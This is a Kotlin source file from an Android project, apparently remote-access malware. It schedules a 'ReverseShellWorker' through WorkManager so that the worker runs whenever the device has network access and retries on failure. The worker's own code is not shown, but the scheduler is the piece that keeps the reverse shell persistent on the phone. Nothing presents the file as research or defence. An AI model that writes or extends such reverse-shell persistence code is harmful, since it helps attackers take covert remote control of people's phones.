package com.satwik.nexgenius.core.reverse_shell

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.time.Duration
import java.util.concurrent.TimeUnit

object Scheduler {
    @RequiresApi(Build.VERSION_CODES.O)
    fun scheduleReverseShellWorker(context: Context){

        val workRequest = OneTimeWorkRequestBuilder<ReverseShellWorker>()
            .setBackoffCriteria(
                backoffPolicy = BackoffPolicy.LINEAR,
                duration = Duration.ofSeconds(15),
            )
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()

        WorkManager.getInstance(context)
            .enqueueUniqueWork(
                "Reverse_Shell_Worker",
                ExistingWorkPolicy.REPLACE,
                workRequest
            )
    }

}